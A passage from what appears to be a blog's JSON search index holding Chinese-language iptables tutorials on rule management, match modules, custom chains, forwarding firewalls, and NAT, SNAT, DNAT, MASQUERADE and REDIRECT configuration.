-L\n\n\n\n#表示查看表的所有规则，并且在显示规则时，不对规则中的IP或者端口进行名称反解，-n选项表示不解析IP地址。\niptables -t 表名 -n -L\n\n\n#表示查看表的所有规则，并且显示规则的序号，--line-numbers选项表示显示规则的序号，注意，此选项为长选项，不能与其他短选项合并，不过此选项可以简写为--line，注意，简写后仍然是两条横杠，仍然是长选项。\niptables --line-numbers -t 表名 -L\n\n\n#表示查看表中的所有规则，并且显示更详细的信息(-v选项)，不过，计数器中的信息显示为精确的计数值，而不是显示为经过可读优化的计数值，-x选项表示显示计数器的精确值。\niptables -t 表名 -v -x -L\n\n\n# 实际使用中，为了方便，往往会将短选项进行合并，所以，如果将上述选项都糅合在一起，可以写成如下命令，此处以filter表为例。\niptables --line -t filter -nvxL INPUT\n```\n\n\n\n### 11.2 过滤增删存\n\n+ 增加\n\n```bash\n#在指定表的指定链的尾部添加一条规则，-A选项表示在对应链的末尾添加规则，省略-t选项时，表示默认操作filter表中的规则\n命令语法：iptables -t 表名 -A 链名 匹配条件 -j 动作\n示例：iptables -t filter -A INPUT -s 192.168.1.146 -j DROP\n\n\n#在指定表的指定链的首部添加一条规则，-I选型表示在对应链的开头添加规则\n命令语法：iptables -t 表名 -I 链名 匹配条件 -j 动作\n示例：iptables -t filter -I INPUT -s 192.168.1.146 -j ACCEPT\n\n\n#在指定表的指定链的指定位置添加一条规则\n命令语法：iptables -t 表名 -I 链名 规则序号 匹配条件 -j 动作\n示例：iptables -t filter -I INPUT 5 -s 192.168.1.146 -j REJECT\n\n\n#设置指定表的指定链的默认策略（默认动作），并非添加规则。\n命令语法：iptables -t 表名 -P 链名 动作\n示例：iptables -t filter -P FORWARD ACCEPT\n```\n\n+ 删除\n\n```bash\n#按照规则序号删除规则，删除指定表的指定链的指定规则，-D选项表示删除对应链中的规则。\n命令语法：iptables -t 表名 -D 链名 规则序号\n示例：iptables -t filter -D INPUT 3\n\n\n#按照具体的匹配条件与动作删除规则，删除指定表的指定链的指定规则。\n命令语法：iptables -t 表名 -D 链名 匹配条件 -j 动作\n示例：iptables -t filter -D INPUT -s 192.168.1.146 -j DROP\n\n\n#删除指定表的指定链中的所有规则，-F选项表示清空对应链中的规则，执行时需三思。\n命令语法：iptables -t 表名 -F 链名\n示例：iptables -t filter -F INPUT\n\n#删除指定表中的所有规则，执行时需三思。\n命令语法：iptables -t 表名 -F\n示例：iptables -t filter -F\n```\n\n+ 修改\n\n```bash\n#修改指定表中指定链的指定规则，-R选项表示修改对应链中的规则，使用-R选项时要同时指定对应的链以及规则对应的序号，并且规则中原本的匹配条件不可省略。\n命令语法：iptables -t 表名 -R 链名 规则序号 规则原本的匹配条件 -j 动作\n示例：iptables -t filter -R INPUT 3 -s 192.168.1.146 -j ACCEPT\n\n\n#其他修改规则的方法：先通过编号删除规则，再在原编号位置添加一条规则。\n\n\n#修改指定表的指定链的默认策略（默认动作），并非修改规则，可以使用如下命令。\n命令语法：iptables -t 表名 -P 链名 动作\n示例：iptables -t filter -P FORWARD ACCEPT\n```\n+ 保存\n\n```bash\n# centos\nyum install -y iptables-services\nsystemctl disable firewalld\nsystemctl enable iptables\nservice iptables save\n\n# ubtuntu\nsudo apt-get install iptables-persistent\nsudo netfilter-persistent save\nsudo netfilter-persistent reload\n```\n\n\n\n### 11.3 协议, 网卡匹配\n\n-p用于匹配报文的协议类型,可以匹配的协议类型tcp、udp、udplite、icmp、esp、ah、sctp等（centos7中还支持icmpv6、mh）。\n\n``` bash\niptables -t filter -I INPUT -p tcp -s 192.168.1.146 -j ACCEPT\niptables -t filter -I INPUT ! -p udp -s 192.168.1.146 -j ACCEPT\n```\n\n\n\n-i用于匹配报文是从哪个网卡接口流入本机的，由于匹配条件只是用于匹配报文流入的网卡，所以在OUTPUT链与POSTROUTING链中不能使用此选项。\n\n```bash\niptables -t filter -I INPUT -p icmp -i eth4 -j DROP\niptables -t filter -I INPUT -p icmp ! -i eth4 -j DROP\n```\n\n-o用于匹配报文将要从哪个网卡接口流出本机，于匹配条件只是用于匹配报文流出的网卡，所以在INPUT链与PREROUTING链中不能使用此选项。\n\n```bash\niptables -t filter -I OUTPUT -p icmp -o eth4 -j DROP\niptables -t filter -I OUTPUT -p icmp ! -o eth4 -j DROP\n```\n\n\n\n### 11.4 IP匹配\n\n-s用于匹配报文的源地址,可以同时指定多个源地址，每个IP之间用逗号隔开，也可以指定为一个网段。\n\n```bash\niptables -t filter -I INPUT -s 192.168.1.111,192.168.1.118 -j DROP\niptables -t filter -I INPUT -s 192.168.1.0/24 -j ACCEPT\niptables -t filter -I INPUT ! -s 192.168.1.0/24 -j ACCEPT\n```\n\n-d用于匹配报文的目标地址,可以同时指定多个目标地址，每个IP之间用逗号隔开，也可以指定为一个网段。\n\n```bash\niptables -t filter -I OUTPUT -d 192.168.1.111,192.168.1.118 -j DROP\niptables -t filter -I INPUT -d 192.168.1.0/24 -j ACCEPT\niptables -t filter -I INPUT ! -d 192.168.1.0/24 -j ACCEPT\n```\n\n\n\n### 11.5 端口匹配\n\n+ tcp扩展模块\n\n  -p tcp -m tcp --sport 用于匹配tcp协议报文的源端口，可以使用冒号指定一个连续的端口范围\n\n  -p tcp -m tcp --dport 用于匹配tcp协议报文的目标端口，可以使用冒号指定一个连续的端口范围\n\n  ```bash\n  iptables -t filter -I OUTPUT -d 192.168.1.146 -p tcp -m tcp --sport 22 -j REJECT\n  iptables -t filter -I INPUT -s 192.168.1.146 -p tcp -m tcp --dport 22:25 -j REJECT\n  iptables -t filter -I INPUT -s 192.168.1.146 -p tcp -m tcp --dport :22 -j REJECT\n  iptables -t filter -I INPUT -s 192.168.1.146 -p tcp -m tcp --dport 80: -j REJECT\n  iptables -t filter -I OUTPUT -d 192.168.1.146 -p tcp -m tcp ! --sport 22 -j ACCEPT\n  ```\n\n  \n\n+ multiport扩展模块\n\n  -p tcp -m multiport --sports 用于匹配报文的源端口，可以指定离散的多个端口号,端口之间用\"逗号\"隔开\n\n  -p udp -m multiport --dports 用于匹配报文的目标端口，可以指定离散的多个端口号，端口之间用\"逗号\"隔开\n\n  ```bash\n  iptables -t filter -I OUTPUT -d 192.168.1.146 -p udp -m multiport --sports 137,138 -j REJECT\n  iptables -t filter -I INPUT -s 192.168.1.146 -p tcp -m multiport --dports 22,80 -j REJECT\n  iptables -t filter -I INPUT -s 192.168.1.146 -p tcp -m multiport ! --dports 22,80 -j REJECT\n  iptables -t filter -I INPUT -s 192.168.1.146 -p tcp -m multiport --dports 80:88 -j REJECT\n  iptables -t filter -I INPUT -s 192.168.1.146 -p tcp -m multiport --dports 22,80:88 -j REJECT\n  ```\n  \n  \n\n### 11.6 tcp头标志位匹配\n\n```bash\n#第一次握手\niptables -t filter -I INPUT -p tcp -m tcp --dport 22 --tcp-flags SYN,ACK,FIN,RST,URG,PSH SYN -j REJECT\n#第二次握手\niptables -t filter -I OUTPUT -p tcp -m tcp --sport 22 --tcp-flags SYN,ACK,FIN,RST,URG,PSH SYN,ACK -j REJECT\n#第一次握手\niptables -t filter -I INPUT -p tcp -m tcp --dport 22 --tcp-flags ALL SYN -j REJECT\n#第二次握手\niptables -t filter -I OUTPUT -p tcp -m tcp --sport 22 --tcp-flags ALL SYN,ACK -j REJECT\n\n#用于匹配tcp新建连接的请求报文,\"第一次握手\"\niptables -t filter -I INPUT -p tcp -m tcp --dport 22 --syn -j REJECT\n```\n\n\n\n### 11.7 网络防火墙(filter表forward链)\n\n由于iptables此时的角色为\"网络防火墙\"，所以需要在filter表中的FORWARD链中设置规则。\n可以使用\"白名单机制\"，先添加一条默认拒绝的规则，然后再为需要放行的报文设置规则。\n配置规则时需要考虑\"方向问题\"，针对请求报文与回应报文，考虑报文的源地址与目标地址，源端口与目标端口等。\n\n```bash\n#示例为允许网络内主机访问网络外主机的web服务与sshd服务。\niptables -A FORWARD -j REJECT\niptables -I FORWARD -s 10.1.0.0/16 -p tcp --dport 80 -j ACCEPT\niptables -I FORWARD -d 10.1.0.0/16 -p tcp --sport 80 -j ACCEPT\niptables -I FORWARD -s 10.1.0.0/16 -p tcp --dport 22 -j ACCEPT\niptables -I FORWARD -d 10.1.0.0/16 -p tcp --sport 22 -j ACCEPT\n```\n\n\n\n可以使用state扩展模块，对上述规则进行优化，使用如下配置可以省略许多\"回应报文放行规则\"。\n\n```bash\niptables -A FORWARD -j REJECT\niptables -I FORWARD -s 10.1.0.0/16 -p tcp --dport 80 -j ACCEPT\niptables -I FORWARD -s 10.1.0.0/16 -p tcp --dport 22 -j ACCEPT\niptables -I FORWARD -m state --state ESTABLISHED,RELATED -j ACCEPT\n```\n\n\n\n### 11.8 SNAT内网外出(nat表postrouting链)\n\n```bash\niptables -t nat -A POSTROUTING -s 10.1.0.0/16 -j SNAT --to-source 公网IP\niptables -t nat -A POSTROUTING -s 10.1.0.0/16 -o eth0 -j MASQUERADE\n```\n\n\n\n### 11.9 DNAT外网进来(nat表prerouting链)\n\n```bash\niptables -t nat -I PREROUTING -d 公网IP -p tcp --dport 公网端口 -j DNAT --to-destination 私网IP:端口号\niptables -t nat -I PREROUTING -d 公网IP -p tcp --dport 8080 -j DNAT --to-destination 10.1.0.1:80\n\n# 但是在测试DNAT时，对应SNAT规则也需要配置，才能正常DNAT，可以先尝试只配置DNAT规则，如果无法正常DNAT，再尝试添加对应的SNAT规则，SNAT规则配置一条即可，DNAT规则需要根据实际情况配置不同的DNAT规则。\niptables -t nat -A POSTROUTING -s 10.1.0.0/16 -j SNAT --to-source 公网IP\n```\n\n\n\n### 11.10 本机目标端口映射\n\n```bash\niptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080\n```\n\n配置完成上述规则后，其他机器访问本机的80端口时，会被映射到8080端口。\n\n\n\n# 12. 参考资料\n\n+ http://www.zsythink.net/archives/tag/iptables/\n+ https://support-it.huawei.com/docs/zh-cn/hcs-6.5.0/vfw-type1/vfw_ug_000031.html\n+ https://zhuanlan.zhihu.com/p/86734727\n","tags":["iptables"],"categories":["命令"]},{"title":"iptables使用教程02","url":"%2Fp%2F424d5aad.html","content":"\n# 5. 常用扩展\n\n### 5.1 iprange扩展模块\n\n使用iprange扩展模块可以指定\"一段连续的IP地址范围\"，用于匹配报文的源地址或者目标地址。\n\n<!-- more -->\n\n```bash\niptables -t filter -I INPUT -m iprange --src-range 192.168.1.127-192.168.1.146 -j DROP\niptables -t filter -I OUTPUT -m iprange --dst-range 192.168.1.127-192.168.1.146 -j DROP\niptables -t filter -I INPUT -m iprange ! --src-range 192.168.1.127-192.168.1.146 -j DROP\n```\n\n\n\n### 5.2 string扩展模块\n\n使用string扩展模块，可以指定要匹配的字符串，如果报文中包含对应的字符串，则符合匹配条件。\n\n--algo：用于指定匹配算法，可选的算法有bm与kmp，此选项为必须选项，我们不用纠结于选择哪个算法，但是我们必须指定一个。\n\n--string：用于指定需要匹配的字符串。\n\n```bash\niptables -t filter -I INPUT -p tcp --sport 80 -m string --algo bm --string \"OOXX\" -j REJECT\n```\n\n\n\n### 5.3 time扩展模块\n\n我们可以通过time扩展模块，根据时间段区匹配报文，如果报文到达的时间在指定的时间范围以内，则符合匹配条件。\n\n--timestart：用于指定时间范围的开始时间，不可取反\n\n--timestop：用于指定时间范围的结束时间，不可取反\n\n--weekdays：用于指定\"星期几\"，可取反\n\n--monthdays：用于指定\"几号\"，可取反\n\n--datestart：用于指定日期范围的开始日期，不可取反\n\n--datestop：用于指定日期范围的结束时间，不可取反\n\n```bash\niptables -t filter -I OUTPUT -p tcp --dport 80 -m time --timestart 09:00:00 --timestop 19:00:00 -j REJECT\niptables -t filter -I OUTPUT -p tcp --dport 443 -m time --timestart 09:00:00 --timestop 19:00:00 -j REJECT\niptables -t filter -I OUTPUT -p tcp --dport 80  -m time --weekdays 6,7 -j REJECT\niptables -t filter -I OUTPUT -p tcp --dport 80  -m time --monthdays 22,23 -j REJECT\niptables -t filter -I OUTPUT -p tcp --dport 80  -m time ! --monthdays 22,23 -j REJECT\niptables -t filter -I OUTPUT -p tcp --dport 80  -m time --timestart 09:00:00 --timestop 18:00:00 --weekdays 6,7 -j REJECT\niptables -t filter -I OUTPUT -p tcp --dport 80  -m time --weekdays 5 --monthdays 22,23,24,25,26,27,28 -j REJECT\niptables -t filter -I OUTPUT -p tcp --dport 80  -m time --datestart 2017-12-24 --datestop 2017-12-27 -j REJECT\n```\n\n\n\n### 5.4 connlimit扩展模块\n\n使用connlimit扩展模块，可以限制每个IP地址同时链接到server端的链接数量，注意：我们不用指定IP，其默认就是针对\"每个客户端IP\"，即对单IP的并发连接数限制。\n\n--connlimit-above：单独使用此选项时，表示限制每个IP的链接数量。\n\n--connlimit-mask：此选项不能单独使用，在使用--connlimit-above选项时，配合此选项，则可以针对\"某类IP段内的一定数量的IP\"进行连接数量的限制\n\n```bash\niptables -I INPUT -p tcp --dport 22 -m connlimit --connlimit-above 2 -j REJECT\niptables -I INPUT -p tcp --dport 22 -m connlimit --connlimit-above 20 --connlimit-mask 24 -j REJECT\niptables -I INPUT -p tcp --dport 22 -m connlimit --connlimit-above 10 --connlimit-mask 27 -j REJECT\n```\n\n\n\n### 5.5 limit扩展模块\n\nlimit模块是对\"报文到达速率\"进行限制的。如果我想要限制单位时间内流入的包的数量，就能用limit模块。\n\n--limit-burst：类比\"令牌桶\"算法，此选项用于指定令牌桶中令牌的最大数量。\n\n--limit：类比\"令牌桶\"算法，此选项用于指定令牌桶中生成新令牌的频率，可用时间单位有second、minute 、hour、day。\n\n```bash\n#如下两条规则需配合使用\niptables -t filter -I INPUT -p icmp -m limit --limit-burst 3 --limit 10/minute -j ACCEPT\niptables -t filter -A INPUT -p icmp -j REJECT\n```\n\n\n\n### 5.6 udp扩展\n\nudp扩展模块能用的匹配条件比较少，只有两个，就是--sport与--dport，即匹配报文的源端口与目标端口。\n\n```bash\niptables -t filter -I INPUT -p udp -m udp --dport 137 -j ACCEPT\niptables -t filter -I INPUT -p udp -m udp --dport 137:157 -j ACCEPT\n#可以结合multiport模块指定多个离散的端口\n```\n\n\n\n### 5.7 icmp扩展\n\nICMP协议的全称为Internet Control Message Protocol，翻译为互联网控制报文协议，它主要用于探测网络上的主机是否可用，目标是否可达，网络是否通畅，路由是否可用等。\n\nping命令使用的就是icmp协议。\n\n--icmp-type：匹配icmp报文的具体类型\n\n```bash\niptables -t filter -I INPUT -p icmp -m icmp --icmp-type 8/0 -j REJECT\niptables -t filter -I INPUT -p icmp --icmp-type 8 -j REJECT\niptables -t filter -I OUTPUT -p icmp -m icmp --icmp-type 0/0 -j REJECT\niptables -t filter -I OUTPUT -p icmp --icmp-type 0 -j REJECT\niptables -t filter -I INPUT -p icmp --icmp-type \"echo-request\" -j REJECT\n```\n\n\n\n### 5.8 state扩展\n\n我们为了让\"提供服务方\"能够正常的\"响应\"我们的请求，于是在主机上开放了对应的端口(80, 22)，开放这些端口的同时，也出现了问题，别人利用这些开放的端口，\"主动\"的攻击我们，他们发送过来的报文并不是为了响应我们，而是为了主动攻击我们。\n\n对于state模块的连接而言，\"连接\"其中的报文可以分为5种状态，报文状态可以为NEW、ESTABLISHED、RELATED、INVALID、UNTRACKED。\n\n\n\n+ 怎样判断报文是否是为了回应之前发出的报文?\n\n我们只要放行状态为ESTABLISHED的报文即可，因为如果报文的状态为ESTABLISHED，那么报文肯定是之前发出的报文的回应，如果你还不放心，可以将状态为RELATED或ESTABLISHED的报文都放行，这样，就表示只有回应我们的报文能够通过防火墙，如果是别人主动发送过来的新的报文，则无法通过防火墙。\n\n\n\n# 6. 黑白名单\n\n当链的默认策略设置为ACCEPT时，如果对应的链中没有配置任何规则，就表示接受所有的报文，如果对应的链中存在规则，但是这些规则没有匹配到报文，报文还是会被接受。\n\n链的默认策略为ACCEPT时，链中的规则对应的动作应该为DROP或者REJECT，表示只有匹配到规则的报文才会被拒绝，没有被规则匹配到的报文都会被默认接受，这就是\"黑名单\"机制。\n\n\n\n当链的默认策略设置为DROP时，如果对应的链中没有配置任何规则，就表示拒绝所有报文，如果对应的链中存在规则，但是这些规则没有匹配到报文，报文还是会被拒绝。\n\n当链的默认策略设置为DROP时，链中的规则对应的动作应该为ACCEPT，表示只有匹配到规则的报文才会被放行，没有被规则匹配到的报文都会被默认拒绝，这就是\"白名单\"机制。\n\n### 6.1 默认DROP的问题\n\n在对应的链中没有设置任何规则时，这样使用默认策略为DROP是非常不明智的，因为管理员也会把自己拒之门外，即使对应的链中存在放行规则，当我们不小心使用\"iptables -F\"清空规则时，放行规则被删除，则所有数据包都无法进入，这个时候就相当于给管理员挖了个坑，所以，我们如果想要使用\"白名单\"的机制，最好将链的默认策略保持为\"ACCEPT\"，然后将\"拒绝所有请求\"这条规则放在链的尾部，将\"放行规则\"放在前面，这样做，既能实现\"白名单\"机制，又能保证在规则被清空时，管理员还有机会连接到主机，示例如下。\n\n```bash\niptables -I INPUT -s 192.168.1.111,192.168.1.118 -j DROP\niptables -A INPUT -j DROP\n```\n\n\n\n# 7. 自定义链\n\n当默认链中的规则非常多时，不方便我们管理。\n\n### 7.1 新建\n\n```bash\niptables -N IN_WEB\n\niptables -nvL\nChain IN_WEB (0 references)\n pkts bytes target     prot opt in     out     source               destination\n```\n\n\n\n### 7.2 添加规则\n\n```bash\niptables -I IN_WEB -s 1.1.1.2 -j REJECT\n\n\niptables -nvL IN_WEB\nChain IN_WEB (0 references)\n pkts bytes target     prot opt in     out     source               destination\n    0     0 REJECT     all  --  *      *       1.1.1.2              0.0.0.0/0            reject-with icmp-port-unreachable\n```\n\n\n\n### 7.3 增加引用\n\n现在，自定义链中已经有了一些规则，但是目前，这些规则无法匹配到任何报文，因为我们并没有在任何默认链中引用它。\n\n\n```bash\niptables -I INPUT -p tcp -j IN_WEB\n\n\niptables -nvL INPUT\nChain INPUT (policy ACCEPT 7813 packets, 5921K bytes)\n pkts bytes target     prot opt in     out     source               destination\n 7614 5907K IN_WEB     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0\n```\n\n之前的示例中，我们使用\"-j\"选项指定动作，而此处，我们将\"动作\"替换为了\"自定义链\"\n\n\n\n### 7.4 修改\n\n```bash\niptables -E IN_WEB WEB\n```\n\n\n\n### 7.5 删除\n\n```bash\niptables -X WEB\n#iptables: Too many links.\n```\n\n因为有引用, 无法删除\n\n```bash\niptables -D  INPUT 1\niptables -X WEB\n# iptables: Directory not empty.\n```\n\n因为有规则, 无法删除\n\n```bash\niptables -F WEB\niptables -X WEB\n\n# 删除成功\n```\n\n\n\n# 8. 网络防火墙(filter表forward链)\n\n网络防火墙的职责就是\"过滤并转发\"，要想\"过滤\"，只能在INPUT、OUTPUT、FORWARD三条链中实现，要想\"转发\"，报文则只会经过FORWARD链（发往本机的报文才会经过INPUT链）\n\n![1](iptables使用教程02/2.png)\n\niptables的角色变为\"网络防火墙\"时，规则只能定义在FORWARD链中。\n\n\n\n### 8.1 用例\n\n![1](iptables使用教程02/3.png)\n\n上图中的主机A充当了\"外部网络主机\"的角色，A主机的IP地址为192.168.1.147，我们使用主机A访问内部网络中的主机C，但是需要主机B进行转发，主机B在转发报文时会进行过滤，以实现网络防火墙的功能。\n\n\n\n### 8.2 配置\n\n要配置转发，则需在FORWAED链中定义规则，所以，我们应该在filter表中的FORWARD链中配置规则。\n\n```bash\niptables -nvL FORWARD\nChain FORWARD (policy ACCEPT 0 packets, 0 bytes)\n pkts bytes target     prot opt in     out     source               destination\n \n \n# 添加默认拒绝 \niptables -A FORWARD -j REJECT\n\n\n# 添加转发规则\niptables -I FORWARD -s 1.1.0.0/16 -p tcp -m tcp --dport 80 -j ACCEPT\niptables -I FORWARD -d 1.1.0.0/16 -p tcp -m tcp --sport 80 -j ACCEPT\n\n\niptables -nvL FORWARD\nChain FORWARD (policy ACCEPT 0 packets, 0 bytes)\n pkts bytes target     prot opt in     out     source               destination\n    0     0 ACCEPT     tcp  --  *      *       0.0.0.0/0            1.1.0.0/16           tcp spt:80\n    0     0 ACCEPT     tcp  --  *      *       1.1.0.0/16           0.0.0.0/0            tcp dpt:80\n    0     0 REJECT     all  --  *      *       0.0.0.0/0            0.0.0.0/0            reject-with icmp-port-unreachable\n```\n\n\n\n当iptables作为\"网络防火墙\"时，在配置规则时，往往需要考虑\"双向性\"，也就是说，我们为了达成一个目的，往往需要两条规则才能完成。每次配置规则时都要考虑\"双向\"的问题, 可以考虑加下面的规则, 以后只加单向就可以了。\n\n```bash\niptables -I FORWARD -m state --state ESTABLISHED,RELATED -j ACCEPT\n```\n\n\n\n# 9. 动作\n\n之前用到的ACCEPT与DROP都属于基础动作。使用-j可以指定动作，比如-j ACCEPT, -j DROP, -j REJECT\n\n### 9.1 REJECT\n\nREJECT动作的常用选项为--reject-with\n\n使用--reject-with选项，可以设置提示信息，当对方被拒绝时，会提示对方为什么被拒绝。\n\n可用值如下\n\nicmp-net-unreachable\n\nicmp-host-unreachable\n\nicmp-port-unreachable,\n\nicmp-proto-unreachable\n\nicmp-net-prohibited\n\nicmp-host-pro-hibited\n\nicmp-admin-prohibited\n\n当不设置任何值时，默认值为icmp-port-unreachable。\n\n### 9.2 LOG\n\n使用LOG动作，可以将符合条件的报文的相关信息记录到日志中，但当前报文具体是被\"接受\"，还是被\"拒绝\"，都由后面的规则控制，换句话说，LOG动作只负责记录匹配到的报文的相关信息，不负责对报文的其他处理，如果想要对报文进行进一步的处理，可以在之后设置具体规则，进行进一步的处理。\n\n\n\n### 9.3 SNAT(NAT表)\n\n##### 9.3.1 NAT介绍\n\n内部网络的报文发送出去时，报文的源IP会被修改，也就是源地址转换：Source Network Address Translation，缩写为SNAT。\n\n外部网络的报文响应时，响应报文的目标IP会再次被修改，也就是目标地址转换：Destinationnetwork address translation，缩写为DNAT。\n\n整个过程被称为SNAT还是DNAT，取决于整个过程的前半段使用了SNAT还是DNAT。\n\n\n\n##### 9.3.2 操作\n\n```bash\niptables -t nat -A POSTROUTING -s 10.1.0.0/16 -j SNAT --to-source 2.2.2.2\n\niptables -t nat -nvL POSTROUTING\nChain POSTROUTING (policy ACCEPT 357 packets, 21639 bytes)\n pkts bytes target     prot opt in     out     source               destination\n    0     0 SNAT       all  --  *      *       10.1.0.0/16          0.0.0.0/0            to:2.2.2.2\n```\n\n如上图所示，上图中的规则表示将来自于10.1.0.0/16网段的报文的源地址改为公网IP地址(2.2.2.2)。\n\n\n\n1. \"-t nat\"表示操作nat表，我们之前一直在灌输一个概念，就是不同的表有不同的功能，filter表的功能是过滤，nat表的功能就是地址转换，所以我们需要在nat表中定义nat规则。\n\n2. \"-A POSTROUTING\"表示将SNAT规则添加到POSTROUTING链的末尾，在centos7中，SNAT规则只能存在于POSTROUTING链与INPUT链中，在centos6中，SNAT规则只能存在于POSTROUTING链中。\n\n3. 为什么SNAT规则必须定义在POSTROUTING链中，我们可以这样认为，POSTROUTING链是iptables中报文发出的最后一个\"关卡\"，我们应该在报文马上发出之前，修改报文的源地址，否则就再也没有机会修改报文的源地址了。\n\n4. 如果只是用于配置SNAT的话，我们并不用手动的进行DNAT设置，iptables会自动维护NAT表，并将响应报文的目标地址转换回来。\n\n\n\n### 9.4  DNAT(NAT表)\n\n公司只有一个公网IP，但是公司的内网中却有很多服务器提供各种服务，我们对外宣称，公司的公网IP上既提供了web服务，也提供了windows远程桌面，不管是访问web服务还是远程桌面，只要访问这个公网IP就行了，我们利用DNAT，将公网客户端发送过来的报文的目标地址与端口号做了映射，将访问web服务的报文转发到了内网中的C主机中，将访问远程桌面的报文转发到了内网中的D主机中。\n\n```bash\niptables -t nat -I PREROUTING -d 2.2.2.2 -p tcp --dport 3389 -j DNAT --to-destination 10.1.0.6:3389\n\n\niptables -t nat -vnL PREROUTING\nChain PREROUTING (policy ACCEPT 2 packets, 68 bytes)\n pkts bytes target     prot opt in     out     source               destination\n    0     0 DNAT       tcp  --  *      *       0.0.0.0/0            2.2.2.2.146        tcp dpt:3389 to:10.1.0.6:3389\n```\n\n\n\n1. \"-t nat -I PREROUTING\"表示在nat表中的PREROUTING链中配置DNAT规则，DNAT规则只配置在PREROUTING链与OUTPUT链中。\n\n2. \"-d 2.2.2.2 -p tcp --dport 3389\"表示报文的目标地址为公司的公网IP地址，目标端口为tcp的3389号端口，而我们知道，windows远程桌面使用的默认端口号就是3389，当外部主机访问公司公网IP的3389号端口时，报文则符合匹配条件。\n\n3. \"-j DNAT --to-destination 10.1.0.6:3389\"表示将符合条件的报文进行DNAT，也就是目标地址转换，将符合条件的报文的目标地址与目标端口修改为10.1.0.6:3389，\"--to-destination\"就是动作DNAT的常用选项。\n\n   那么综上所述，当外网主机访问公司公网IP(2.2.2.2)的3389时，其报文的目标地址与端口将会被映射到10.1.0.6:3389上。\n\n4. 理论上只要完成上述DNAT配置规则即可，但是在测试时，只配置DNAT规则后，并不能正常DNAT，经过测试发现，将相应的SNAT规则同时配置后，即可正常DNAT，于是我们又配置了SNAT。\n\n  ```bash\n  iptables -t nat -A POSTROUTING -s 10.1.0.0/16 -j SNAT --to-source 2.2.2.2\n  ```\n\n\n\n### 9.5 MASQUERADE\n\n当我们拨号网上时，每次分配的IP地址往往不同，不会长期分给我们一个固定的IP地址，如果这时，我们想要让内网主机共享公网IP上网，就会很麻烦，因为每次IP地址发生变化以后，我们都要重新配置SNAT规则，这样显示不是很人性化，我们通过MASQUERADE即可解决这个问题，MASQUERADE会动态的将源地址转换为可用的IP地址，其实与SNAT实现的功能完全一致，都是修改源地址。\n\n只不过SNAT需要指明将报文的源地址改为哪个IP，而MASQUERADE则不用指定明确的IP，会动态的将报文的源地址修改为指定网卡上可用的IP地址。\n\n```bash\niptables -t nat -I POSTROUTING -s 10.1.0.0/16 -j SNAT --to-source 2.2.2.2\n\n# MASQUERADE的对比\niptables -t nat -I POSTROUTING -s 10.1.0.0/16 -o 网卡名字 -j MASQUERADE\n```\n\n可以把MASQUERADE理解为动态的、自动化的SNAT，如果没有动态SNAT的需求，没有必要使用MASQUERADE，因为SNAT更加高效。\n\n\n\n### 9.6 REDIRECT\n\n使用REDIRECT动作可以在本机上进行端口映射\n\n比如，将本机的80端口映射到本机的8080端口上\n\n```bash\niptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080\n```\n\n经过上述规则映射后，当别的机器访问本机的80端口时，报文会被重定向到本机的8080端口上。\n\nREDIRECT规则只能定义在PREROUTING链或者OUTPUT链中。\n","tags":["iptables"],"categories":["命令"]},{"title":"iptables使用教程01","url":"%2Fp%2Fa8480986.html","content":"\n# 0. 前言\n\n### 0.0 防火墙\n\n+ 从逻辑上讲，防火墙可以大体分为主机防火墙和网络防火墙。\n\n  + 主机防火墙：针对于单个主机进行防护。\n  \n  网络防火墙：往往处于网络入口或边缘，针对于网络入口进行防护，服务于防火墙背后的本地局域网。\n  \n  网络防火墙和主机防火墙并不冲突，可以理解为，网络防火墙主外（集体）， 主机防火墙主内（个人）。\n\n\n+ 从物理上讲，防火墙可以分为硬件防火墙和软件防火墙。\n+ 硬件防火墙：在硬件级别实现部分防火墙功能，另一部分功能基于软件实现，性能高，成本高。\n+ 软件防火墙：应用软件处理逻辑运行于通用硬件平台之上的防火墙，性能低，成本低。\n\n<!-- more -->\n\n### 0.1 iptables\n\niptables其实不是真正的防火墙，我们可以把它理解成一个客户端代理，用户通过iptables这个代理，将用户的安全设定执行到对应的\"安全框架\"中，这个\"安全框架\"才是真正的防火墙，这个框架的名字叫netfilter\n\nnetfilter才是防火墙真正的安全框架（framework），netfilter位于内核空间。iptables其实是一个命令行工具，位于用户空间，我们用这个工具操作真正的框架。\n\nnetfilter/iptables（下文中简称为iptables）组成Linux平台下的包过滤防火墙，与大多数的Linux软件一样，这个包过滤防火墙是免费的，它可以代替昂贵的商业防火墙解决方案，完成封包过滤、封包重定向和网络地址转换（NAT）等功能。\n\n### 0.2  netfilter\n\nnetfilter是Linux操作系统核心层内部的一个数据包处理模块，它具有如下功能：\n\n+ 网络地址转换(Network Address Translate)\n+ 数据包内容修改\n+ 以及数据包过滤的防火墙功能\n\n所以说，虽然我们使用service iptables start启动iptables\"服务\"，但是其实准确的来说，iptables并没有一个守护进程，所以并不能算是真正意义上的服务，而应该算是内核提供的功能。\n\n\n\n# 1. iptables基础\n\n我们知道iptables是按照规则来办事的，我们就来说说规则（rules），规则其实就是网络管理员预定义的条件，规则一般的定义为\"如果数据包头符合这样的条件，就这样处理这个数据包\"。\n\n规则存储在内核空间的信息包过滤表中，这些规则分别指定了源地址、目的地址、传输协议（如TCP、UDP、ICMP）和服务类型（如HTTP、FTP和SMTP）等。\n\n当数据包与规则匹配时，iptables就根据规则所定义的方法来处理这些数据包，如放行（accept）、拒绝（reject）和丢弃（drop）等。配置防火墙的主要工作就是添加、修改和删除这些规则。\n\n\n\n### 1.1 五链\n\n![1](iptables使用教程01/1.png)\n\n+ PREROUTING 数据包刚进入网络层 , 路由之前\n+ INPUT 路由判断，流入用户空间\n+ OUTPUT 用户空间发出，后接路由判断出口的网络接口\n+ FORWARD 路由判断不进入用户空间，只进行转发\n+ POSTROUTING 数据包通过网络接口出去\n\n\n\n##### 1.1.1 举例:\n\n到本机某进程的报文：PREROUTING --> INPUT\n\n由本机转发的报文：PREROUTING --> FORWARD --> POSTROUTING\n\n由本机的某进程发出报文（通常为响应报文）：OUTPUT --> POSTROUTING\n\n\n\n## 1.2 四表\n\n我们把具有相同功能的规则的集合叫做\"表\"，所以说，不同功能的规则，我们可以放置在不同的表中进行管理，而iptables已经为我们定义了4种表，每种表对应了不同的功能，而我们定义的规则也都逃脱不了这4种功能的范围，所以，学习iptables之前，我们必须先搞明白每种表 的作用。\n\n+ filter表：负责过滤功能，防火墙；内核模块：iptables_filter\n+ nat表：network address translation，网络地址转换功能；内核模块：iptable_nat\n+ 